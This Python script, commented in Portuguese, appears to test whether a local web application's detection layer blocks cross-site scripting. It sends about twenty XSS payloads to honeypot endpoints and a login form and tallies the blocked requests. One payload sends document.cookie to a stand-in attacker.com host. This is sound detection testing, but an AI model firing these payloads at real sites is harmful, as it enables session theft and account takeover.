"""
Script de Ataque Controlado - Cross-Site Scripting (XSS)
Testa a detecção de tentativas de XSS
"""

import requests
import time
from typing import List
import argparse

BASE_URL = "http://localhost:3000"

# Payloads comuns de XSS
XSS_PAYLOADS = [
    # Basic XSS
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    
    # Event handlers
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<iframe onload=alert('XSS')>",
    
    # JavaScript protocols
    "<a href='javascript:alert(\"XSS\")'>Click</a>",
    "<img src='javascript:alert(\"XSS\")'>",
    
    # Advanced payloads
    "<script>document.cookie</script>",
    "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
    "'-alert(String.fromCharCode(88,83,83))-'",
    "\"><script>alert(String.fromCharCode(88,83,83))</script>",
    
    # Encoded
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    
    # DOM-based
    "<img src=x onerror=\"javascript:alert(1)\">",
    "<svg><script>alert('XSS')</script></svg>",
    
    # Bypass attempts
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    "<img src=x oneonerrorrror=alert('XSS')>",
]


def test_xss_honeypot(payloads: List[str], delay: float = 0):
    """
    Testa XSS nos honeypots
    """
    honeypots = ["/admin", "/debug", "/.env", "/db"]
    
    print(f"\n🟠 Testando XSS - Honeypot Endpoints")
    print(f"   Payloads: {len(payloads)} x {len(honeypots)} endpoints\n")
    
    results = {
        "total_attempts": 0,
        "blocked": 0,
        "errors": 0,
    }

    for endpoint in honeypots:
        for idx, payload in enumerate(payloads, 1):
            try:
                results["total_attempts"] += 1

                # Testa com payload na query string
                response = requests.get(
                    f"{BASE_URL}{endpoint}?search={payload}&input={payload}",
                    timeout=5,
                )

                if response.status_code == 403:
                    results["blocked"] += 1
                    status = "🛡️  BLOCKED"
                elif response.status_code < 500:
                    status = "⚠️  NOT BLOCKED"
                else:
                    status = "❌ ERROR"
                    results["errors"] += 1

                print(f"   [{idx:2d}/{len(payloads)}] {endpoint:10s} | {status}")
                
                time.sleep(delay)

            except requests.exceptions.Timeout:
                results["errors"] += 1
                print(f"   [{idx:2d}/{len(payloads)}] {endpoint:10s} | ⏱️  TIMEOUT")
            except Exception as e:
                results["errors"] += 1
                print(f"   [{idx:2d}/{len(payloads)}] {endpoint:10s} | ❌ {str(e)[:40]}")

    return results


def test_xss_post_data(payloads: List[str], delay: float = 0):
    """
    Testa XSS em POST data
    """
    endpoint = f"{BASE_URL}/auth/login"
    
    print(f"\n🟠 Testando XSS - POST Data")
    print(f"   Payloads: {len(payloads)}\n")
    
    results = {
        "total_attempts": 0,
        "blocked": 0,
        "errors": 0,
    }

    for idx, payload in enumerate(payloads, 1):
        try:
            results["total_attempts"] += 1

            # Testa no campo email
            response = requests.post(
                endpoint,
                json={"email": payload, "password": "test123"},
                timeout=5,
            )

            if response.status_code == 403:
                results["blocked"] += 1
                status = "🛡️  BLOCKED"
            elif response.status_code == 401:
                status = "⚠️  NOT BLOCKED (401)"
            else:
                status = f"⚠️  NOT BLOCKED ({response.status_code})"

            print(f"   [{idx:2d}/{len(payloads)}] Email field | {status}")
            
            time.sleep(delay)

        except requests.exceptions.Timeout:
            results["errors"] += 1
            print(f"   [{idx:2d}/{len(payloads)}] Email field | ⏱️  TIMEOUT")
        except Exception as e:
            results["errors"] += 1
            print(f"   [{idx:2d}/{len(payloads)}] Email field | ❌ {str(e)[:40]}")

    return results


def print_summary(results: dict):
    """
    Exibe resumo dos resultados
    """
    print("\n" + "=" * 50)
    print("📊 RESUMO DO ATAQUE XSS")
    print("=" * 50)
    print(f"Total de Tentativas: {results['total_attempts']}")
    print(f"Bloqueadas:          {results['blocked']}")
    print(f"Erros:               {results['errors']}")
    
    if results['total_attempts'] > 0:
        block_rate = (results['blocked'] / results['total_attempts']) * 100
        print(f"\nTaxa de Bloqueio:    {block_rate:.1f}%")
    
    print("=" * 50 + "\n")


def main():
    parser = argparse.ArgumentParser(
        description="Testa detecção de ataques XSS"
    )
    parser.add_argument(
        "--mode",
        choices=["all", "honeypot", "post"],
        default="all",
        help="Modo de teste (padrão: all)",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0,
        help="Delay entre requisições em segundos (padrão: 0 - sem delay)",
    )
    parser.add_argument(
        "--count",
        type=int,
        help="Número de payloads a usar (padrão: todos)",
    )

    args = parser.parse_args()

    payloads = XSS_PAYLOADS[: args.count] if args.count else XSS_PAYLOADS

    print("\n" + "=" * 50)
    print("🎯 XSS ATTACK SIMULATOR")
    print("=" * 50)
    print(f"Target: {BASE_URL}")
    print(f"Mode:   {args.mode}")
    print(f"Delay:  {args.delay}s")
    print("=" * 50)

    all_results = {
        "total_attempts": 0,
        "blocked": 0,
        "errors": 0,
    }

    try:
        if args.mode in ["all", "honeypot"]:
            results = test_xss_honeypot(payloads, args.delay)
            all_results["total_attempts"] += results["total_attempts"]
            all_results["blocked"] += results["blocked"]
            all_results["errors"] += results["errors"]

        if args.mode in ["all", "post"]:
            results = test_xss_post_data(payloads, args.delay)
            all_results["total_attempts"] += results["total_attempts"]
            all_results["blocked"] += results["blocked"]
            all_results["errors"] += results["errors"]

        print_summary(all_results)

    except KeyboardInterrupt:
        print("\n\n⚠️  Ataque interrompido pelo usuário")
        print_summary(all_results)


if __name__ == "__main__":
    main()
